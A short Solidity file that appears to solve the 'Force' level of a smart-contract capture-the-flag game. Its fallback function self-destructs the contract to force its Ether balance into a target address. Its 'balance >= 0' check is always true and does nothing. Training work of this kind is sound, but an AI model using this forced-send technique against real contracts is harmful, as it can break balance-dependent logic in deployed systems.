// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Phorce {
    address payable targetAddress;

    constructor(address payable _targetAddress) {
        targetAddress = _targetAddress;
    }

    fallback() external payable {
        uint balance = address(this).balance;
        require(balance >= 0, "No Eth To Self Destruct");
        selfdestruct(targetAddress);
    }
}

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}